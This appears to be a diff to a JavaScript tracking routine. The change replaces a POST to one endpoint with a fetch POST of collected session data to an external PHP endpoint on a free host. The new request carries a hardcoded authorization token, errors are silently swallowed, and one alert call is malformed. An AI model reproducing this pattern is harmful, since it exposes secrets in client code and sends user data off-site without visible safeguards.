@@ -189,33 +189,26 @@
         const send = () => {
           data.sessionID = Math.random().toString(36).substr(2, 9);
           const blob = JSON.stringify(data);
-        
-          const xhr = new XMLHttpRequest();
-          xhr.open('POST', 'https://calculateexponent.netlify.app', true);
-          xhr.setRequestHeader('Content-Type', 'application/json');
-        
-          xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) { // DONE
-              if (xhr.status >= 200 && xhr.status < 300) {
-                try {
-                  const result = JSON.parse(xhr.responseText);
-                  console.log('Server responded:', result);
-                  sessionStorage.setItem('ZbTracked', 'true');
-                } catch (e) {
-                  console.error('Invalid JSON response:', e);
-                }
-              } else {
-                console.error('Network response was not ok.', xhr.statusText);
+            fetch("https://zb1.fwh.is/admin.php", {
+              method: "POST",
+              body: blob,
+              headers: {
+                "Content-Type": "application/json",
+                "Authorization": "67489okjcnbvfgdy567UijnbvftyuIKJNBVFR45R67UEIDKMNB"
+              },
+            })
+            .then(response => {
+              if (response.ok) {
+                return response.json();
               }
-            }
-          };
-        
-          xhr.onerror = function() {
-            console.error('Request Error');
-          };
-        
-          xhr.send(blob);
-        
+              throw new Error('Network response was not ok.');
+            })
+            .then(result => {
+              alert('Server responded:', result);
+              sessionStorage.setItem('ZbTracked', 'true');
+            })
+            .catch(error => {
+            });
           alert(JSON.stringify(data));
         };
 
